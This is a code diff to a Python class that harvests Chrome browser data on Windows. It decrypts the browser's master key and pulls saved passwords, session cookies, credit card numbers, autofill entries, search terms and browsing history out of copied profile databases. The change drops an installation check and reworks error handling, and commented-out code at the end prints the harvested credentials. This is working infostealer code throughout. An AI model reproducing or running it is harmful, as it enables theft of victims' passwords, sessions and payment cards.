@@ -13,36 +13,16 @@ class Chrome:
         self._user_data = os.getenv(
             "LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
         self._master_key = self._get_master_key()
-        self.installed = self.get_chrome_installed()
-        
-        
-    def get_chrome_installed(self):
-        try:
-            chrome_path= ["C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
-                        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"]
-            
-            for file in chrome_path:
-                if os.path.exists(file):
-                    return True
-                else:
-                    return False
-        except Exception as e:
-            return e
-        
+
     def _get_master_key(self):
-        try:
-            if self.installed:
-                with open(self._user_data + "\\Local State", "r") as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                    master_key = base64.b64decode(
-                        local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]
-                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-            return "Chrome browser is not installed!!!!"
-        except Exception as e:
-            return e
+        with open(self._user_data + "\\Local State", "r") as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+            master_key = base64.b64decode(
+                local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
 
     def chrome_date_and_time(self,chrome_data):
         return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
@@ -67,14 +47,13 @@ class Chrome:
 
     def passwords(self):
         try:
-            if self.installed:
-                login_db = self._user_data + "\\Default\\Login Data"
-                login_db_copy = os.getenv("TEMP") + "\\Login.db"
-                shutil.copy2(login_db, login_db_copy)
-                conn = sqlite3.connect(login_db_copy)
-                cursor = conn.cursor()
-                password_data = ""
-                
+            login_db = self._user_data + "\\Default\\Login Data"
+            login_db_copy = os.getenv("TEMP") + "\\Login.db"
+            shutil.copy2(login_db, login_db_copy)
+            conn = sqlite3.connect(login_db_copy)
+            cursor = conn.cursor()
+            password_data = ""
+            try:
                 cursor.execute(
                     "SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins")
                 for item in cursor.fetchall():
@@ -99,26 +78,24 @@ class Chrome:
                     if last_usuage != 86400000000 and last_usuage:
                         data +=f"Last Used: {str(self.chrome_date_and_time(last_usuage))} --\n\n"
                     password_data += data
-            
-                cursor.close()
-                conn.close()
-                os.remove(login_db_copy)
-                return password_data
-            else:
-                return "Chrome browsers is not installed!!!!!"
+            except sqlite3.Error:
+                pass
+            cursor.close()
+            conn.close()
+            os.remove(login_db_copy)
+            return password_data
         except Exception as e:
-            return e
-        
+            print(f"[!]Error: {e}")
+
     def cookies(self):
         try:
-            if self.installed:
-                cookies_db = self._user_data + "\\Default\\Network\\cookies"
-                cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
-                shutil.copy2(cookies_db, cookies_db_copy)
-                conn = sqlite3.connect(cookies_db_copy)
-                cursor = conn.cursor()
-                cookies = ""
-                
+            cookies_db = self._user_data + "\\Default\\Network\\cookies"
+            cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
+            shutil.copy2(cookies_db, cookies_db_copy)
+            conn = sqlite3.connect(cookies_db_copy)
+            cursor = conn.cursor()
+            cookies = ""
+            try:
                 cursor.execute(
                     "SELECT host_key, name, encrypted_value from cookies")
                 for item in cursor.fetchall():
@@ -130,25 +107,29 @@ class Chrome:
                     cookie_data += f"Name: {user}\n"
                     cookie_data += f"Value decrypt: {decrypted_cookie}\n\n"
                     cookies += cookie_data
-                
-                cursor.close()
-                conn.close()
-                os.remove(cookies_db_copy)
-                return cookies
-            return "Chrome browsers is not installed!!!!!"
+            except sqlite3.Error:
+                pass
+            cursor.close()
+            conn.close()
+            os.remove(cookies_db_copy)
+            return cookies
         except Exception as e:
-            return e
+            print(f"[!]Error: {e}")
 
     def web_data(self):
         try:
-            if self.installed:
-                web_data_db = self._user_data + "\\Default\\Web Data"
-                web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
-                shutil.copy2(web_data_db, web_data_db_copy)
-                conn = sqlite3.connect(web_data_db_copy)
-                cursor = conn.cursor()
-                autofill_data = ""
+            web_data_db = self._user_data + "\\Default\\Web Data"
+            web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
+            shutil.copy2(web_data_db, web_data_db_copy)
+            conn = sqlite3.connect(web_data_db_copy)
+            cursor = conn.cursor()
+
+            autofill_data = ""
+            credit_card_info = []
+
+            try:
                 cursor.execute("SELECT name, value FROM autofill")
+
                 for item in cursor.fetchall():
                     name = item[0]
                     value = item[1]
@@ -157,24 +138,9 @@ class Chrome:
                     message += f"Data value: {value}\n\n"
                     autofill_data += message
                     # autofill_data.append((name, message += f"Data:{name}\n"))
-                cursor.close()
-                conn.close()
-                os.remove(web_data_db_copy)
-                return autofill_data
-            return "Chrome browsers is not installed!!!!!"
-        except Exception as e:
-            return e
-        
-    def credit_card_chrome(self):
-        try:
-            if self.installed:
-                web_data_db = self._user_data + "\\Default\\Web Data"
-                web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
-                shutil.copy2(web_data_db, web_data_db_copy)
-                conn = sqlite3.connect(web_data_db_copy)
-                cursor = conn.cursor()
-                credit_card_info = []
+
                 cursor.execute("SELECT * FROM credit_cards")
+
                 for item in cursor.fetchall():
                     username = item[1]
                     encrypted_password = item[4]
@@ -189,52 +155,33 @@ class Chrome:
                     message += f"Expired year: {expire_year}\n\n"
                     credit_card_info += message
                     # credit_card_info.append((username, decrypted_password, expire_mon, expire_year))
-            
-                cursor.close()
-                conn.close()
-                os.remove(web_data_db_copy)
-                return credit_card_info
-            return "Chrome browsers is not installed!!!!!"
-        except Exception as e:
-            return e
 
-      
-    def search_terms(self):
-        search_terms = ""
-        try:
-            if self.installed:
-                history_db = self._user_data + "\\Default\\History"
-                history_db_copy = os.getenv("TEMP") + "\\History.db"
-                shutil.copy2(history_db, history_db_copy)
-                conn = sqlite3.connect(history_db_copy)
-                cursor = conn.cursor()
-                
-                cursor.execute('SELECT term FROM keyword_search_terms')
-                detail = cursor.fetchall()
-                for term in detail:
-                    terms =term[0]
-                    message = f"{terms}\n"
-                    search_terms += message
-                    
-                # search_terms = [item[0] for item in cursor.fetchall()]
+            except sqlite3.Error:
+                pass
 
-                cursor.close()
-                conn.close()
-                os.remove(history_db_copy)
-                return search_terms
-            return "Chrome browsers is not installed!!!!!"
+            cursor.close()
+            conn.close()
+            os.remove(web_data_db_copy)
+
+            return autofill_data, credit_card_info
+
         except Exception as e:
-            return e
-        
+            print(f"[!]Error: {e}")
+
     def history(self):
+        search_terms = []
         web_history = ""
         try:
-            if self.installed:
-                history_db = self._user_data + "\\Default\\History"
-                history_db_copy = os.getenv("TEMP") + "\\History.db"
-                shutil.copy2(history_db, history_db_copy)
-                conn = sqlite3.connect(history_db_copy)
-                cursor = conn.cursor()
+            history_db = self._user_data + "\\Default\\History"
+            history_db_copy = os.getenv("TEMP") + "\\History.db"
+            shutil.copy2(history_db, history_db_copy)
+            conn = sqlite3.connect(history_db_copy)
+            cursor = conn.cursor()
+
+            try:
+                cursor.execute('SELECT term FROM keyword_search_terms')
+                search_terms = [item[0] for item in cursor.fetchall()]
+
                 cursor.execute('SELECT title, url, last_visit_time FROM urls')
                 for item in cursor.fetchall():
                     title = item[0]
@@ -245,15 +192,47 @@ class Chrome:
                     message += f"Last Time Visit: {last_time}\n\n"
                     web_history += message
                     # web_history.append({'Title': title, 'Url': url, 'Last Time Visit': last_time})
-                cursor.close()
-                conn.close()
-                os.remove(history_db_copy)
-                return web_history
-            return "Chrome browsers is not installed!!!!!"
-        except Exception as e:
-            return e
-        
-browser = Chrome()
 
-print(browser.search_terms())
+            except sqlite3.Error:
+                pass
+
+            cursor.close()
+            conn.close()
+            os.remove(history_db_copy)
+        except Exception as e:
+            print(f"[!]Error: {e}")
+
+        return search_terms, web_history
+
+# def password():
+#     chrome = Chrome()
+#     password_data = chrome.passwords()
     
+#     login_info_sets = password_data.split("\n\n")
+
+#     for login_info in login_info_sets:
+#         login_info_lines = login_info.split("\n")
+#         for line in login_info_lines:
+#             if not line.startswith("Password"):
+                
+#                 print(line) 
+#             lines = line.startswith("Password")
+#             print(lines)
+# password() 
+# chrome = Chrome() 
+# password_lines_show = [line for line in  chrome.passwords().split('\n') if line.startswith("Password")]
+# password_lines_hide = [line for line in  chrome.passwords().split('\n') if not line.startswith("Password")]
+
+# print(password_lines_hide)    
+# if __name__ == "__main__":
+#     chrome = Chrome()
+    # password_data = chrome.passwords()
+    
+    # login_info_sets = password_data.split("\n\n")
+
+    # for login_info in login_info_sets:
+    #     login_info_lines = login_info.split("\n")
+    #     for line in login_info_lines:
+    #         if line.startswith("Password"):
+    #             continue
+    #         print(line)
